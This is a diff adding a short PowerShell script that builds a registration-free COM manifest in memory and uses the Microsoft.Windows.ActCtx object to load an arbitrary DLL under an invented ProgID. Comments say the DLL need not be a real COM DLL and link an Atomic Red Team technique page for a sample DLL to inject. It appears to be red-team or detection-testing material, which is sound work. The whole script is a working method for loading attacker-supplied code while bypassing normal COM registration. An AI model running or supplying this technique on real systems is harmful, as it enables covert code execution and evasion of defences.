@@ -1,0 +1,9 @@
+#Doesn't Even Have to Be A Conformant COM DLL To trigger the load.
+
+# Sample DLL To inject here 
+# https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1179
+
+$manifest = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?> <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"> 	<assemblyIdentity type="win32" name="LiterallyDoesentMatter" version="6.6.6.0"/> 	<file name="Anyname.dll.anything">     	<comClass         	description="Any Description HERE"         	clsid="{89565276-A714-4a43-91FE-EDACDCC0FFEE}" threadingModel="Both"         	progid="JustMakeSomethingUp"/> 	</file>  </assembly>';
+$ax = new-object -Com "Microsoft.Windows.ActCtx"
+$ax.ManifestText = $manifest;
+$DWX = $ax.CreateObject("JustMakeSomethingUp");
